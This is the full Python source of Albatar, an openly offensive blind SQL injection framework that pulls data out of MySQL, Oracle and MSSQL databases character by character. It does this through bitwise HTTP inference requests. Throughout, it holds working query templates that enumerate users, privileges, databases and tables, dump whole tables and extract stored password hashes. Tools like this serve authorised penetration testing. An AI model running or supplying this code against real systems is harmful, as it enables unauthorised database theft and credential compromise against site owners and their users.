#!/usr/bin/env python

# Copyright (C) 2015 Sebastien MACKE
#
# This program is free software; you can redistribute it and/or modify it under
# the terms of the GNU General Public License version 2, as published by the
# Free Software Foundation
#
# This program is distributed in the hope that it will be useful, but WITHOUT
# ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
# FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
# details (http://www.gnu.org/licenses/gpl.txt).

__author__  = 'Sebastien Macke'
__email__   = 'lanjelot@gmail.com'
__url__     = 'https://github.com/lanjelot/albatar'
__twitter__ = 'https://twitter.com/lanjelot'
__version__ = 'n/a'
__license__ = 'GPLv2'
__banner__  = 'Albatar v%s (%s)' % (__version__, __url__)

# logging / imports / utils {{{
import logging

fmt1 = logging.Formatter('%(asctime)s %(name)s - %(message)s', datefmt='%H:%M:%S')
fmt2 = logging.Formatter('%(asctime)s %(name)s %(levelname)7s %(threadName)s - %(message)s', datefmt='%H:%M:%S')

sh = logging.StreamHandler()
sh.setFormatter(fmt1)
sh.setLevel(logging.INFO)

fh = logging.FileHandler('albatar.log')
fh.setFormatter(fmt2)
fh.setLevel(logging.DEBUG)

logger = logging.getLogger('albatar')
logger.setLevel(logging.DEBUG)

logger.addHandler(sh)
logger.addHandler(fh)

from Queue import Queue, Empty
from time import sleep, time
from threading import Thread, active_count, current_thread
from urlparse import urlparse, urlunparse
from string import Template
import sys
from collections import OrderedDict
try:
  import requests
  from requests.auth import HTTPBasicAuth
except ImportError:
  try:
    import pycurl
  except ImportError:
    logger.error('python-requests or pycurl required')
  try:
    from cStringIO import StringIO
  except ImportError:
    from StringIO import StringIO

def T(s, **kwargs):
  return Template(s).safe_substitute(**kwargs)

class Timing:
  def __enter__(self):
    self.t1 = time()
    return self

  def __exit__(self, exc_type, exc_value, traceback):
    self.time = time() - self.t1

def substitute_payload(payload, *args):
    new = []
    for arg in args:
      new.append(arg.replace('${injection}', payload))
    return new
# }}}

# Requester {{{
class Requester_HTTP_Base(object):

  def __init__(self, state_tester, url, method='GET', body='', headers=[],
    auth_type='basic', auth_creds='', proxies={}, ssl_cert='', encode_payload=lambda x: x):

    self.state_tester = state_tester
    self.http_opts = url, method, body, headers, auth_type, auth_creds, proxies, ssl_cert
    self.encode_payload = encode_payload

  def check_state(self, payload, status_code, header_data, response_data, response_time, content_length):

    stats = '%s %d:%d %.3f' % (status_code, len(header_data+response_data), int(content_length), response_time)
    logger.debug('%s %s' % (stats, payload))

    return self.state_tester(header_data, response_data, response_time)

class Requester_HTTP_requests(Requester_HTTP_Base):

  def __init__(self, *args, **kwargs):
    super(Requester_HTTP_requests, self).__init__(*args, **kwargs)

    _, _, _, _, auth_type, auth_creds, proxies, ssl_cert = self.http_opts

    auth = None
    if auth_creds:
      if auth_type == 'basic':
        u, p = auth_creds.split(':', 1)
        auth = requests.auth.HTTPBasicAuth(u, p)

    self.session = requests.Session()
    self.session.proxies = proxies
    self.session.auth = auth
    self.session.cert = ssl_cert

  def test(self, payload):

    url, method, body, headers, _, _, _, _ = self.http_opts

    url, body, headers = substitute_payload(self.encode_payload(payload), url, body, '\r\n'.join(headers))

    headers = dict(h.split(': ', 1) for h in headers.split('\r\n') if h)

    response = self.session.send(
      self.session.prepare_request(
        requests.Request(url=url, method=method, headers=headers, data=body)))

    header_data = '\r\n'.join('%s: %s' % (k, v) for k, v in response.headers.iteritems())

    if 'content-length' in response.headers:
      content_length = response.headers['content-length']
    else:
      content_length = -1

    return self.check_state(payload, response.status_code, header_data, response.text, response.elapsed.total_seconds(), content_length)

class Requester_HTTP_pycurl(Requester_HTTP_Base):

  def __init__(self, *args, **kwargs):
    super(Requester_HTTP_pycurl, self).__init__(*args, **kwargs)

    fp = pycurl.Curl()
    fp.setopt(pycurl.SSL_VERIFYPEER, 0)
    fp.setopt(pycurl.SSL_VERIFYHOST, 0)
    fp.setopt(pycurl.HEADER, 1)
    fp.setopt(pycurl.USERAGENT, 'Mozilla/5.0')
    fp.setopt(pycurl.NOSIGNAL, 1)

    _, _, _, _, auth_type, auth_creds, proxies, ssl_cert = self.http_opts

    fp.setopt(pycurl.PROXY, proxies['http'] or proxies['https'])

    if auth_creds:
      fp.setopt(pycurl.USERPWD, auth_creds)
      if auth_type == 'basic':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_BASIC)
      elif auth_type == 'digest':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_DIGEST)
      elif auth_type == 'ntlm':
        fp.setopt(pycurl.HTTPAUTH, pycurl.HTTPAUTH_NTLM)
      else:
        raise NotImplementedError("Incorrect auth_type '%s'" % auth_type)
    
    if ssl_cert:
      fp.setopt(pycurl.SSLCERT, ssl_cert)

    def noop(buf): pass
    fp.setopt(pycurl.WRITEFUNCTION, noop)
    fp.setopt(pycurl.VERBOSE, 1)

    self.fp = fp

  def test(self, payload):

    url, method, body, headers, auth_type, auth_creds, proxy, ssl_cert = self.http_opts

    def debug_func(t, s):
      if t == pycurl.INFOTYPE_HEADER_IN:
        header_buffer.write(s)

      elif t == pycurl.INFOTYPE_DATA_IN:
        response_buffer.write(s)
    header_buffer, response_buffer = StringIO(), StringIO()

    fp = self.fp
    fp.setopt(pycurl.DEBUGFUNCTION, debug_func)

    scheme, host, path, params, query, fragment = urlparse(url)
    query, body, headers = substitute_payload(self.encode_payload(payload), query, body, '\r\n'.join(headers))

    method = method.upper()
    if method == 'GET':
      fp.setopt(pycurl.HTTPGET, 1)

    elif method == 'POST':
      fp.setopt(pycurl.POST, 1)
      fp.setopt(pycurl.POSTFIELDS, body)

    elif method == 'HEAD':
      fp.setopt(pycurl.NOBODY, 1)

    else:
      fp.setopt(pycurl.CUSTOMREQUEST, method)

    url = urlunparse((scheme, host, path, params, query, fragment))
    
    fp.setopt(pycurl.URL, url)
    fp.setopt(pycurl.HTTPHEADER, headers.split('\r\n'))
    fp.perform()

    status_code = fp.getinfo(pycurl.HTTP_CODE)
    response_time = fp.getinfo(pycurl.TOTAL_TIME) - fp.getinfo(pycurl.PRETRANSFER_TIME)
    content_length = fp.getinfo(pycurl.CONTENT_LENGTH_DOWNLOAD)
    header_data, response_data = header_buffer.getvalue(), response_buffer.getvalue()

    return self.check_state(payload, status_code, header_data, response_data, response_time, content_length)

Requester_HTTP = Requester_HTTP_requests
#Requester_HTTP = Requester_HTTP_pycurl
# }}}

# Method {{{
class Method_Base:

  def __init__(self, make_requester, template, num_threads=7, rate_limit=0, confirm_char=False):
    self.make_requester = make_requester
    self.template = template
    self.num_threads = num_threads
    self.rate_limit = rate_limit
    self.confirm_char = confirm_char

  def execute(self, query, start_offset, stop_offset):
    logger.info('Executing: %s' % repr(query))

    self.taskq = Queue()
    self.resultq = Queue()

    for i in range(self.num_threads):
      t = Thread(target=self.consume, args=())
      t.daemon = True
      t.start()

    start_index, stop_index = int(start_offset), int(stop_offset)

    if isinstance(query, basestring):
      self.query = query

    else:
      if stop_index == 1:
        self.query, _ = query
        stop_index = int(self.get_row())

      _, self.query = query

    logger.debug('retrieving %d rows, starting at row %d' % (stop_index-start_index, start_index))
      
    for row_index in range(start_index, stop_index):
      yield self.get_row(row_index)

  def get_row(self, row_pos): pass

  def make_payload(self, query, **kwargs):

    payload = T(self.template, query=query)
    for k, v in kwargs.iteritems():
      payload = T(payload, **kwargs)

    return payload

class Method_binary(Method_Base):
  '''Binary Search'''
  pass

class Method_bitwise(Method_Base):
  '''Bit ANDing'''

  def get_state(self):
    while True:
      try:
        tid, state = self.resultq.get(False, 1)
        break
      except Empty:
        pass
    return tid, state

  def get_row(self, row_pos=0):

    logger.debug('query: %s' % self.query)

    result = ''
    char_pos = 1
    while True:
      sleep(self.rate_limit)

      for bit_pos in range(7):
        payload = self.make_payload(query=self.query, char_pos=char_pos, bit_mask=1<<bit_pos, row_pos=row_pos)
        self.taskq.put_nowait((bit_pos, payload))

      char = 0
      for _ in range(7):
        bit_pos, state = self.get_state()
        char |= state << bit_pos

      logger.debug('char: %d (%s)' % (char, repr(chr(char))))

      if char >= 127:
        continue

      if char == 0:
        break

      if self.confirm_char:

        payload = self.make_payload(query=self.query, char_pos=char_pos, bit_mask=char, row_pos=row_pos)
        self.taskq.put_nowait((0, payload))

        _, state = self.get_state()
        if not state:
          requester = self.make_requester()
          logger.debug('could not confirm char')
          continue

      sys.stdout.write('%s' % chr(char))
      sys.stdout.flush()

      result += chr(char)
      char_pos += 1

    sys.stdout.write('\r')
    sys.stdout.flush()

    logger.debug('row %d: %s' % (row_pos, result))
    return result

  def consume(self):

    requester = self.make_requester()

    while True:
      task_id, payload = self.taskq.get()
      try_count = 0

      while True:
        try_count += 1

        try:
          state = requester.test(payload)
          self.resultq.put((task_id, state))

          break
        except:
          mesg = '%s %s' % sys.exc_info()[:2]
          logger.warn('try %d, caught: %s' % (try_count, mesg))
          logger.exception(sys.exc_info()[1])

          sleep(try_count * 2)

          requester = self.make_requester()
          continue
# }}}

# Main {{{
class SQLi_Base:

  def __init__(self, method):
    self.method = method

  def exploit(self):

    from sys import argv
    from optparse import OptionParser, OptionGroup

    usage_str = """usage: %prog [options]
    $ %prog -q 'select version()'"""

    parser = OptionParser(usage=usage_str)

    parser.add_option('-d', '--debug', dest='debug', action='store_true', default=False, help='print debug messages')

    enumeration = OptionGroup(parser, 'Enumeration')
    enumeration.add_option('-q', '--query', dest='query', help='SQL statement to execute')
    enumeration.add_option('-b', '--banner', dest='banner', action='store_true', help='')
    enumeration.add_option('--current-user', dest='current_user', action='store_true', help='')
    enumeration.add_option('--current-db', dest='current_db', action='store_true', help='')
    enumeration.add_option('--hostname', dest='hostname', action='store_true', help='')

    enumeration.add_option('--privileges', dest='enum_privileges', action='store_true', help='')
    enumeration.add_option('--roles', dest='enum_roles', action='store_true', help='')

    enumeration.add_option('--users', dest='enum_users', action='store_true', help='')
    enumeration.add_option('--passwords', dest='enum_passwords', action='store_true', help='')

    enumeration.add_option('--dbs', dest='enum_dbs', action='store_true', help='')
    enumeration.add_option('--tables', dest='enum_tables', action='store_true')
    enumeration.add_option('--columns', dest='enum_columns', action='store_true')
    enumeration.add_option('--dump', dest='dump_table', action='store_true', help='')

    enumeration.add_option('-D', dest='db', default='', metavar='', help='')
    enumeration.add_option('-T', dest='table', default='', metavar='', help='')
    enumeration.add_option('-C', dest='column', default='', metavar='', help='')
    enumeration.add_option('-U', dest='user', default='', metavar='', help='')

    enumeration.add_option('--start', dest='start_offset', default='0', metavar='', help='')
    enumeration.add_option('--stop', dest='stop_offset', default='1', metavar='', help='')

    parser.option_groups.extend([enumeration])
    (opts, args) = parser.parse_args(argv[1:])

    queries = []

    if opts.banner:
      queries.append(self.banner())

    if opts.current_user:
      queries.append(self.current_user())

    if opts.current_db:
      queries.append(self.current_db())

    if opts.hostname:
      queries.append(self.hostname())

    if opts.enum_privileges:
      for user in opts.user.split(','):
        queries.append(self.enum_privileges(user))

    if opts.enum_roles:
      for user in opts.user.split(','):
        queries.append(self.enum_roles(user))

    if opts.enum_users:
      queries.append(self.enum_users())

    if opts.enum_passwords:
      for user in opts.user.split(','):
        queries.append(self.enum_passwords(user))

    if opts.enum_dbs:
      queries.append(self.enum_dbs())

    if opts.enum_tables:
      for db in opts.db.split(','):
        queries.append(self.enum_tables(opts.db))

    if opts.enum_columns:
      for table in opts.table.split(','):
        queries.append(self.enum_columns(opts.db, opts.table))

    if opts.dump_table:
      queries.append(self.dump_table(opts.db, opts.table, opts.column.split(',')))

    if opts.query:
      queries.append(opts.query)

    with Timing() as timing:
      try:
        for query in queries:
          for result in self.method.execute(query, start_offset=opts.start_offset, stop_offset=opts.stop_offset):
            yield result
      except KeyboardInterrupt:
        print

    logger.info("Time: %.2f seconds" % (timing.time))

# }}}

# MySQL {{{
class MySQL_Blind(SQLi_Base):
  
  def banner(self):
    return 'SELECT @@VERSION'

  def current_user(self):
    return 'SELECT USER()'

  def current_db(self):
    return 'SELECT DATABASE()'

  def hostname(self):
    return 'SELECT @@HOSTNAME'

  def enum_privileges(self, user):
    c = 'SELECT COUNT(DISTINCT(privilege_type)) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee="%s"' % user
    q = 'SELECT DISTINCT(privilege_type) FROM INFORMATION_SCHEMA.USER_PRIVILEGES WHERE grantee="%s" LIMIT ${row_pos},1' % user
    return c, q

  def enum_users(self):
    c = 'SELECT COUNT(DISTINCT(grantee)) FROM information_schema.user_privileges'
    q = 'SELECT DISTINCT(grantee) FROM information_schema.user_privileges LIMIT ${row_pos},1'
    return c, q

  def enum_passwords(self, user):
    if not user:
      raise NotImplementedError('-U required')

    c = 'SELECT COUNT(DISTINCT(password)) FROM mysql.user WHERE user="%s"' % user
    q = 'SELECT DISTINCT(password) FROM mysql.user WHERE user="%s" LIMIT ${row_pos},1' % user
    return c, q

  def enum_dbs(self):
    c = 'SELECT COUNT(schema_name) FROM information_schema.schemata'
    q = 'SELECT schema_name FROM information_schema.schemata LIMIT ${row_pos},1'
    return c, q

  def enum_tables(self, db):
    if db:
      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema="%s"' % db
      q = 'SELECT table_name FROM information_schema.tables WHERE table_schema="%s" LIMIT ${row_pos},1' % db
    else:
      c = 'SELECT COUNT(*) FROM information_schema.tables WHERE table_schema' \
          ' NOT IN ("information_schema","mysql","performance_schema")'
      q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name) FROM information_schema.tables WHERE table_schema' \
          ' NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
    return c, q

  def enum_columns(self, db, table):
    if db:
      if table:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s"' % (db, table)
        q = 'SELECT column_name FROM information_schema.columns WHERE table_schema="%s" AND table_name="%s" LIMIT ${row_pos},1' % (db, table)
      else:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema="%s"' % db
        q = 'SELECT CONCAT_WS(0x3a,table_name,column_name) FROM information_schema.columns WHERE table_schema="%s" LIMIT ${row_pos},1' % db
    else:
        c = 'SELECT COUNT(*) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema")'
        q = 'SELECT CONCAT_WS(0x3a,table_schema,table_name,column_name) FROM information_schema.columns WHERE table_schema NOT IN ("information_schema","mysql","performance_schema") LIMIT ${row_pos},1'
    return c, q

  def dump_table(self, db, table, cols):
    c = 'SELECT COUNT(*) FROM %s.%s' % (db, table)
    q = 'SELECT CONCAT_WS(0x3a,%s) FROM %s.%s LIMIT ${row_pos},1' % (','.join(cols), db, table)
    return c, q
# }}}

# Oracle {{{
class Oracle_Blind(SQLi_Base):

  def banner(self):
    return 'SELECT banner FROM v$version WHERE ROWNUM=1'

  def current_user(self):
    return 'SELECT user FROM dual'

  def hostname(self):
    return 'SELECT UTL_INADDR.GET_HOST_NAME FROM DUAL'

  def enum_privileges(self, user):
    if user:
      c = "SELECT COUNT(PRIVILEGE) FROM DBA_SYS_PRIVS WHERE USERNAME='%s'" % user.upper()
      q = "SELECT PRIVILEGE FROM (SELECT PRIVILEGE,ROWNUM-1 AS LIMIT FROM DBA_SYS_PRIVS WHERE USERNAME='%s') WHERE LIMIT=${row_pos}" % user.upper()
    else:
      c = "SELECT COUNT(PRIVILEGE) FROM USER_SYS_PRIVS"
      q = "SELECT PRIVILEGE FROM (SELECT PRIVILEGE,ROWNUM-1 AS LIMIT FROM USER_SYS_PRIVS) WHERE LIMIT=${row_pos}"
    return c, q

  def enum_roles(self, user):
    if user:
      c = "SELECT COUNT(GRANTED_ROLE) FROM DBA_ROLE_PRIVS WHERE USERNAME='%s'" % user.upper()
      q = "SELECT GRANTED_ROLE FROM (SELECT GRANTED_ROLE,ROWNUM-1 AS LIMIT FROM DBA_ROLE_PRIVS WHERE USERNAME='%s') WHERE LIMIT=${row_pos}"  % user.upper()

    else:
      c = "SELECT COUNT(GRANTED_ROLE) FROM USER_ROLE_PRIVS"
      q = "SELECT GRANTED_ROLE FROM (SELECT GRANTED_ROLE,ROWNUM-1 AS LIMIT FROM USER_ROLE_PRIVS) WHERE LIMIT=${row_pos}"
    return c, q

  def enum_users(self):
    c = 'SELECT COUNT(USERNAME) FROM SYS.ALL_USERS'
    q = 'SELECT USERNAME FROM (SELECT USERNAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=${row_pos}'
    return c, q

  def enum_passwords(self, user):
    if user:
      c = "SELECT COUNT(PASSWORD) FROM SYS.USER$ WHERE NAME='%s'" % user.upper()
      q = "SELECT PASSWORD FROM (SELECT PASSWORD,ROWNUM-1 AS LIMIT FROM SYS.USER$ WHERE NAME='%s') WHERE LIMIT=${row_pos}" % user.upper()
    else:
      c = "SELECT COUNT(PASSWORD) FROM SYS.USER$"
      q = "SELECT NAME||':'||PASSWORD FROM (SELECT PASSWORD,ROWNUM-1 AS LIMIT FROM SYS.USER$) WHERE LIMIT=${row_pos}"
    return c, q

  def enum_dbs(self):
    c = 'SELECT COUNT(DISTINCT(OWNER)) FROM SYS.ALL_TABLES'
    q = 'SELECT OWNER FROM (SELECT OWNER,ROWNUM-1 AS LIMIT FROM (SELECT DISTINCT(OWNER) FROM SYS.ALL_TABLES)) WHERE LIMIT=${row_pos}'
    return c, q

  def enum_tables(self, db):
    if not db:
      raise NotImplementedError('-D required')

    c = "SELECT COUNT(TABLE_NAME) FROM SYS.ALL_TABLES WHERE OWNER='%s'" % db
    q = "SELECT TABLE_NAME FROM (SELECT TABLE_NAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_TABLES WHERE OWNER='%s') WHERE LIMIT=${row_pos}" % db
    return c, q

  # bugfix for sqlmap
  def enum_columns(self, db, table):
    if not db:
      raise NotImplementedError('-D required')
    if not table:
      raise NotImplementedError('-T required')

    c = "SELECT COUNT(COLUMN_NAME) FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s'" % (table, db)
    q = "SELECT COLUMN_NAME FROM (SELECT COLUMN_NAME,ROWNUM-1 AS LIMIT FROM SYS.ALL_TAB_COLUMNS WHERE TABLE_NAME='%s' AND OWNER='%s') WHERE LIMIT=${row_pos}" % (table, db)
    return c, q

  def dump_table(self, db, table, cols):
    if not db:
      raise NotImplementedError('-D required')
    if not table:
      raise NotImplementedError('-T required')
    if not cols:
      raise NotImplementedError('-C required')

    c = "SELECT COUNT(*) FROM %s" % table
    q = "SELECT ENTRY_VALUE FROM (SELECT %s AS ENTRY_VALUE,ROWNUM-1 AS LIMIT FROM %s) WHERE LIMIT=${row_pos}" % ('||chr(58)||'.join(cols), table)
    return c, q

# }}}

# MSSQL {{{
class MSSQL_Blind(SQLi_Base):

  def banner(self):
    return 'SELECT @@VERSION'

  def current_user(self):
    return 'SELECT SYSTEM_USER'

  def current_db(self):
    return 'SELECT DB_NAME()'

  def hostname(self):
    return 'SELECT @@SERVERNAME'

  def enum_users(self):
    c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..syslogins'
    q = 'SELECT TOP 1 name FROM master..syslogins WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..syslogins ORDER BY name) ORDER BY name'
    return c, q

  def enum_passwords(self, user):
    if not user:
      raise NotImplementedError('-U required')

    c = T("SELECT LTRIM(STR(COUNT(password_hash))) FROM sys.sql_logins WHERE name='${user}'", user=user)
    q = T("SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins WHERE name='${user}'"\
        " AND password_hash NOT IN (SELECT TOP ${row_pos} password_hash FROM sys.sql_logins WHERE name='${user}' ORDER BY password_hash)" \
        " ORDER BY password_hash", user=user)
    return c, q

  def enum_dbs(self):
    c = 'SELECT LTRIM(STR(COUNT(name))) FROM master..sysdatabases'
    q = 'SELECT TOP 1 name FROM master..sysdatabases WHERE name' \
        ' NOT IN (SELECT TOP ${row_pos} name FROM master..sysdatabases ORDER BY name) ORDER BY name'
    return c, q

  def enum_tables(self, db):
    if not db:
      raise NotImplementedError('-D required')

    c = T("SELECT LTRIM(STR(COUNT(name))) FROM %s..sysobjects WHERE xtype = 'U'", db=db)
    q = T("SELECT TOP 1 name FROM ${db}..sysobjects WHERE xtype = 'U'" \
          " AND name NOT IN (SELECT TOP ${row_pos} name FROM ${db}..sysobjects WHERE xtype = 'U' ORDER BY name) ORDER BY name", db=db)
    return c, q

  def enum_columns(self, db, table):
    if not db:
      raise NotImplementedError('-D required')
    if not table:
      raise NotImplementedError('-T required')

    c = T("SELECT LTRIM(STR(COUNT(x.name))) FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}'", db=db, table=table)
    q = T("SELECT TOP 1 x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' AND x.name" \
          " NOT IN (SELECT TOP ${row_pos} x.name FROM ${db}..syscolumns x,${db}..sysobjects y WHERE x.id=y.id AND y.name='${table}' ORDER BY x.name)" \
          " ORDER BY x.name", db=db, table=table)
    return c, q

  def dump_table(self, db, table, cols):
    if not db:
      raise NotImplementedError('-D required')
    if not table:
      raise NotImplementedError('-T required')
    if not cols:
      raise NotImplementedError('-C required')

    c = T("SELECT LTRIM(STR(COUNT(*))) FROM ${db}..${table}", db=db, table=table)
    q = T("SELECT TOP 1 ${cols} FROM ${db}..${table} WHERE ${cols}" \
          " NOT IN (SELECT TOP ${row_pos} ${cols} FROM ${db}..${table} ORDER BY 1) ORDER BY 1", cols="+':'+".join(cols), table=table, db=db)
    return c, q
# }}}

# vim: ts=2 sw=2 sts=2 et fdm=marker
